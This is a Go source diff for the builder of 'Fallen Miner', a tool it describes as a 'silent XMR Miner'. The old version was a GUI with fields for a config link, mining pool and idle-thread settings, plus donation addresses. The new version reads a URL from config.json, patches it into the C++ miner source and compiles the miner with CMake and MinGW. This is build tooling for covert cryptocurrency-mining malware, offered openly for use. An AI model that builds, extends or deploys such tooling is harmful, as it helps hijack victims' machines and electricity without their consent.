@@ -1,203 +1,194 @@
 package main
 
 import (
-	"embed"
+	"bytes"
 	"encoding/json"
 	"fmt"
-	"image/color"
-	"log"
-	"net/url"
-	"strconv"
-
-	"fyne.io/fyne/v2"
-	"fyne.io/fyne/v2/app"
-	"fyne.io/fyne/v2/canvas"
-	"fyne.io/fyne/v2/container"
-	"fyne.io/fyne/v2/dialog"
-	"fyne.io/fyne/v2/layout"
-
-	"fyne.io/fyne/v2/theme"
-	"fyne.io/fyne/v2/widget"
+	"math/rand"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"runtime"
 )
 
-//go:embed icon.jpg
-var iconFile embed.FS
+const (
+	pastebinlink   = ""
+	srcFile        = "src/main.cpp"
+	backupFileName = "src/main.cpp.bak"
+)
+
+var (
+	cmakePath string
+	makePath  string
+	mingwPath string
+)
+
+type Config struct {
+	Url string `json:"url"`
+}
+
+func init() {
+
+	exeDir, _ := os.Executable()
+	baseDir := filepath.Dir(exeDir)
+
+	cmakePath = filepath.Join(baseDir, "portable_tools", "cmake", "bin", "cmake.exe")
+	makePath = filepath.Join(baseDir, "portable_tools", "make", "bin", "make.exe")
+	mingwPath = filepath.Join(baseDir, "portable_tools", "mingw64", "bin")
+
+	currentPath := os.Getenv("PATH")
+	newPath := fmt.Sprintf("%s;%s", mingwPath, currentPath)
+	os.Setenv("PATH", newPath)
+}
 
 func main() {
-	iconData, err := iconFile.ReadFile("icon.jpg")
+	fileContent, err := os.ReadFile("config.json")
 	if err != nil {
-		log.Fatal("Failed to read embedded icon:", err)
+		fmt.Printf("Error reading file: %v\n", err)
+		return
 	}
-	iconResource := fyne.NewStaticResource("icon.jpg", iconData)
-	Fallen := app.New()
-	FallenWindow := Fallen.NewWindow("Fallen Builder")
 
-	FallenWindow.Resize(fyne.NewSize(875, 500))
-	FallenWindow.SetFixedSize(true)
+	// Parse the JSON into our struct
+	var config Config
+	err = json.Unmarshal(fileContent, &config)
+	if err != nil {
+		fmt.Printf("Error parsing JSON: %v\n", err)
+		return
+	}
+	buildclient(config.Url)
 
-	FallenWindow.SetIcon(iconResource)
-	image := canvas.NewImageFromResource(iconResource)
-	image.SetMinSize(fyne.NewSize(250, 250))
-	image.FillMode = canvas.ImageFillContain
+}
 
-	image.Resize(fyne.NewSize(250, 250))
+func copyFile(src, dest string) error {
 
-	serverAddressEntry := widget.NewEntry()
-	serverAddressEntry.SetPlaceHolder("Enter pastebin or gituhb direct link (only 1 supported currently.)")
+	data, err := os.ReadFile(src)
+	if err != nil {
+		return err
+	}
 
-	tab1Content := container.NewVBox(
-		widget.NewLabel("Builder"),
-		serverAddressEntry,
+	err = os.WriteFile(dest, data, 0644)
+	if err != nil {
+		return err
+	}
 
-		widget.NewButton("Build", func() {
-			serverAddress := serverAddressEntry.Text
-			if serverAddress != "" {
-				buildclient(serverAddress, FallenWindow)
-			} else {
-				dialog.ShowInformation("Error", "Please enter a server address.", FallenWindow)
+	return nil
+}
+
+func CopyFolder(src, dst string) error {
+
+	srcInfo, err := os.Stat(src)
+	if err != nil {
+		return err
+	}
+
+	err = os.MkdirAll(dst, srcInfo.Mode())
+	if err != nil {
+		return err
+	}
+
+	entries, err := os.ReadDir(src)
+	if err != nil {
+		return err
+	}
+
+	for _, entry := range entries {
+		srcPath := src + "/" + entry.Name()
+		dstPath := dst + "/" + entry.Name()
+
+		if entry.IsDir() {
+			err = CopyFolder(srcPath, dstPath)
+			if err != nil {
+				return err
 			}
-		}),
-	)
+		} else {
 
-	appNameLabel := canvas.NewText("Fallen Miner, an open source silent XMR Miner.", color.White)
-	appNameLabel.TextSize = 15
-
-	donateLabel := canvas.NewText("Want to donate directly?", color.White)
-	donateLabel.TextSize = 15
-
-	XMRbutton := widget.NewButton("XMR - Click to copy to clipboard", func() {
-		clipboard := FallenWindow.Clipboard()
-		clipboard.SetContent("85VkL5hw9YceMWVHPGNoFgLxQxw6qwNdF51uAz96WPYmhDYwswVHhoaWPXWjvFGBstGhUNBgR9UvqcqVvYHDmAvcC9yPy4S")
-	})
-
-	BTCbutton := widget.NewButton("BTC - Click to copy to clipboard", func() {
-		clipboard := FallenWindow.Clipboard()
-		clipboard.SetContent("bc1qrj9006vls5udt907ad8jvkts5e4d5tlua5794d")
-	})
-
-	LTCbutton := widget.NewButton("LTC - Click to copy to clipboard", func() {
-		clipboard := FallenWindow.Clipboard()
-		clipboard.SetContent("ltc1qw7stjsqayppp726jgjwp2362djw7jplqzj2r0c")
-	})
-
-	githuburl, _ := url.Parse("https://github.com/laprosa/Fallen-Miner")
-
-	githubLink := widget.NewHyperlink("Created by Incog, you should of downloaded this from my github", githuburl)
-
-	textContainer := container.NewVBox(
-		layout.NewSpacer(),
-		appNameLabel,
-		layout.NewSpacer(),
-		githubLink,
-		donateLabel,
-		XMRbutton,
-		BTCbutton,
-		LTCbutton,
-	)
-
-	textContainer = container.NewCenter(textContainer)
-
-	tab2Content := container.NewVBox(
-		image,
-		textContainer,
-	)
-
-	addressEntry := widget.NewEntry()
-	addressEntry.SetPlaceHolder("Enter address...")
-
-	idleThreadsEntry := widget.NewEntry()
-	idleThreadsEntry.SetPlaceHolder("Enter idle threads...")
-
-	idleTimeEntry := widget.NewEntry()
-	idleTimeEntry.SetPlaceHolder("Enter idle time...")
-
-	passwordEntry := widget.NewEntry()
-	passwordEntry.SetPlaceHolder("Enter password...")
-
-	poolEntry := widget.NewEntry()
-	poolEntry.SetPlaceHolder("Enter pool...")
-
-	threadsEntry := widget.NewEntry()
-	threadsEntry.SetPlaceHolder("Enter threads...")
-
-	sslEntry := widget.NewEntry()
-	sslEntry.SetPlaceHolder("Enter SSL (0 or 1)...")
-
-	createJSONButton := widget.NewButton("Create JSON", func() {
-		idleThreads, err := strconv.Atoi(idleThreadsEntry.Text)
-		if err != nil {
-			dialog.ShowError(fmt.Errorf("invalid idle threads: %v", err), FallenWindow)
-			return
+			err = copyFile(srcPath, dstPath)
+			if err != nil {
+				return err
+			}
 		}
+	}
+	return nil
+}
 
-		idleTime, err := strconv.Atoi(idleTimeEntry.Text)
-		if err != nil {
-			dialog.ShowError(fmt.Errorf("invalid idle time: %v", err), FallenWindow)
-			return
-		}
+func randomquote() string {
+	quote := []string{"This better be legal.", "I can't stick to a schedule", "This should work...", "At least I don't steal bots *cough*", "t.me/fallenminer", "You like jazz?"}
+	return quote[rand.Intn(len(quote))]
+}
 
-		threads, err := strconv.Atoi(threadsEntry.Text)
-		if err != nil {
-			dialog.ShowError(fmt.Errorf("invalid threads: %v", err), FallenWindow)
-			return
-		}
+func buildclient(serveraddress string) {
+	originalDir, err := os.Getwd()
+	if err != nil {
+		panic(err)
+	}
+	defer os.Chdir(originalDir)
 
-		ssl, err := strconv.Atoi(sslEntry.Text)
-		if err != nil || (ssl != 0 && ssl != 1) {
-			dialog.ShowError(fmt.Errorf("invalid SSL value (must be 0 or 1): %v", err), FallenWindow)
-			return
-		}
+	fmt.Println("building: ", randomquote())
 
-		data := map[string]interface{}{
-			"address":      addressEntry.Text,
-			"threads":      threads,
-			"idle_threads": idleThreads,
-			"idle_time":    idleTime,
-			"password":     passwordEntry.Text,
-			"pool":         poolEntry.Text,
-			"ssl":          ssl,
-		}
+	if err := backupFile(srcFile, backupFileName); err != nil {
+		panic(err)
+	}
 
-		jsonData, err := json.MarshalIndent(data, "", "  ")
-		if err != nil {
-			dialog.ShowError(fmt.Errorf("failed to create JSON: %v", err), FallenWindow)
-			return
-		}
+	if err := modifyURL(srcFile, serveraddress); err != nil {
+		panic(err)
+	}
 
-		FallenWindow.Clipboard().SetContent(string(jsonData))
+	if err := buildProject(); err != nil {
+		panic(err)
+	}
 
-		dialog.ShowInformation("JSON Created", "JSON copied to clipboard!", FallenWindow)
-	})
+	if err := restoreFile(backupFileName, srcFile); err != nil {
+		panic(err)
+	}
 
-	configContainer := container.NewVBox(
-		widget.NewLabel("Address:"),
-		addressEntry,
-		widget.NewLabel("Threads:"),
-		threadsEntry,
-		widget.NewLabel("Idle Threads:"),
-		idleThreadsEntry,
-		widget.NewLabel("Idle Time:"),
-		idleTimeEntry,
-		widget.NewLabel("Password:"),
-		passwordEntry,
-		widget.NewLabel("Pool:"),
-		poolEntry,
-		widget.NewLabel("SSL (0 or 1):"),
-		sslEntry,
-		createJSONButton,
-	)
+	fmt.Println("built.")
+}
 
-	tab3Content := container.NewVBox(
-		configContainer,
-	)
+func backupFile(src, dst string) error {
+	fmt.Printf("Backing up %s to %s\n", src, dst)
+	return copyFile(src, dst)
+}
 
-	tab1 := container.NewTabItemWithIcon("Builder", theme.ComputerIcon(), tab1Content)
-	tab2 := container.NewTabItemWithIcon("About", theme.InfoIcon(), tab2Content)
-	tab3 := container.NewTabItemWithIcon("Generate config", theme.FileIcon(), tab3Content)
+func modifyURL(filename, newURL string) error {
+	fmt.Printf("Modifying URL in %s to %s\n", filename, newURL)
 
-	tabs := container.NewAppTabs(tab1, tab3, tab2)
+	content, err := os.ReadFile(filename)
+	if err != nil {
+		return err
+	}
 
-	FallenWindow.SetContent(tabs)
+	// Replace any existing URL pattern
+	newContent := bytes.Replace(content,
+		[]byte(`std::wstring url = L"http";`),
+		[]byte(fmt.Sprintf(`std::wstring url = L"%s";`, newURL)),
+		1)
 
-	FallenWindow.ShowAndRun()
+	return os.WriteFile(filename, newContent, 0644)
+}
+
+func buildProject() error {
+	fmt.Println("Configuring project with CMake...")
+
+	// Create build directory
+	if err := os.MkdirAll("build", 0755); err != nil {
+		return err
+	}
+
+	// Use absolute path to CMake
+	cmake := exec.Command(cmakePath, "-G", "MinGW Makefiles", "..")
+	cmake.Dir = "build"
+	if err := cmake.Run(); err != nil {
+		return fmt.Errorf("CMake failed: %v", err)
+	}
+
+	numCores := runtime.NumCPU()
+	fmt.Printf("Using %d CPU cores\n", numCores)
+	make := exec.Command(makePath, fmt.Sprintf("-j%d", numCores))
+	make.Dir = "build"
+	return make.Run()
+}
+
+func restoreFile(src, dst string) error {
+	fmt.Printf("Restoring %s from %s\n", dst, src)
+	return copyFile(src, dst)
 }
